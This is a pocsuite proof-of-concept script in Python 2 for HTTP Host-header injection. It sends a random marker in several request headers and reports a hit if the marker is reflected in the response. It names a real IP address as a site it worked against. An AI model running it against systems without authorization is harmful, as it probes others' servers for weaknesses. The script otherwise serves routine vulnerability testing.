#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class HTTPPOC(POCBase):
    vulID = '25'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-05-07' #漏洞公开的时间,不知道就写今天

    author = 'wangqi' #  PoC作者的大名
    createDate = '2018-05-07'# 编写 PoC 的日期
    updateDate = '2018-05-07'# PoC 更新的时间,默认和编写时间一样
    references = 'https://www.cnblogs.com/bmjoker/p/8809231.html'# 漏洞地址来源,0day不用写
    name = 'http header Injection'# PoC 名称
    appPowerLink = '#'# 漏洞厂商主页地址
    appName = 'http'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'CRLF Injection'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Host头注入漏洞
    ''' # 漏洞简要描述
    samples = ['112.49.24.34']# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"中危" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r http-header-injection.py -u 10.1.5.26 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取定义请求头
        import random
        seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        sa = []
        for i in range(8):
          sa.append(random.choice(seed))
        salt = ''.join(sa)
        headers = {
            'Host': salt,
            'User-agent': salt,
            'X-Forwarded-For': salt,
            'cookie': salt,
        }
        proxies = {
            # 'http': 'http://127.0.0.1:8080',
            # 'https': 'http://127.0.0.1:8080',
        }
        try:
            response = req.get(url=self.url, headers=headers,timeout=5, proxies=proxies) 
        except Exception, e:
            response = ""
        """
        """
        check = response.headers
        # print check
        if response:
            for x in check:
                if salt in check[x]:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
                    result['VerifyInfo']['Payload'] = 'Host: ' + salt
                    break
        else:
            result = {}
        print '[+]25 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(HTTPPOC)

